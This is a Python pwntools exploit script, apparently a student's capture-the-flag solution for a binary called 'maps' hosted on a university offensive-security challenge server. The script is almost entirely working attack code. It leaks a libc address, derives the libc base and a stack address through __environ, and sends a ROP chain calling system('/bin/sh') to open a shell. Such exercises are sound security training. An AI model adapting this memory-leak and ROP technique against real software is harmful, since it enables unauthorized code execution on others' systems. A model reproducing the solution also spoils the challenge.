from os import environ

from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]
context.arch = "amd64"
context.os = "linux"
target_file = "./maps"

LOCAL = False

if LOCAL:
    # p = process(target_file)
    p = gdb.debug(target_file, '''
    b main
    b fgets
    continue
    ''', aslr=False)
    libc = "/lib/x86_64-linux-gnu/libc.so.6"
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1205)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")
    libc = "./libc.so.6"

libc_elf = ELF(libc, checksec=False)
target_elf = ELF(target_file, checksec=False)

# Setup the base address information
# Receive the address of stdin
# This will be used as send output below to set the rdi register for the
p.recvuntil(b'free: ')
stdin_address = u64(p.recvline().strip())
print(f'stdin address: {hex(stdin_address)}')

# Compute the base address of libc
stdin_offset = libc_elf.symbols._IO_2_1_stdin_
base_address = stdin_address - stdin_offset
print(f'Libc base address: {hex(base_address)}')
system_address = libc_elf.symbols.system + base_address
print(f'system address: {hex(system_address)}')

# Find /bin/sh string and system function in libc
bin_sh = next(libc_elf.search(b"/bin/sh\x00")) + base_address
print(f"Found /bin/sh at {hex(bin_sh)}")

# Handle the first input by sending a packed decimal
p.recvuntil(b'to go?\n')
environ_address = libc_elf.symbols.__environ + base_address
print(f'Address of environ: {hex(environ_address)}')
p.send(p64(environ_address))
address_of_envvars = int(p.recvline().strip(), 16)
print(f'Address of envvars: {hex(address_of_envvars)}')

if LOCAL:
    target_address = address_of_envvars - 0x148 + 0x10
else:
    target_address = address_of_envvars - 0x148 + 0x20

print(f'Target address: {hex(target_address)}')

# Handle the second input by sending a packed decimal
p.recvuntil(b'Could you say it again?\n')
p.send(p64(target_address))  # Example packed decimal

# Handle the third input by sending the payload
# This needs to be stdin address to set rdi for fgets
p.recvuntil(b'what are you planning to do?\n')

# Find ROP gadgets
rop = ROP(libc, checksec=False)
rdi_gadget = rop.rdi.address + base_address
ret_gadget = rop.ret.address + base_address

# Create the ROP chain
chain = [
    ret_gadget,
    ret_gadget,
    rdi_gadget,
    bin_sh,
    system_address,
]
payload = b''.join([p64(c) for c in chain])

p.sendline(payload)

p.interactive()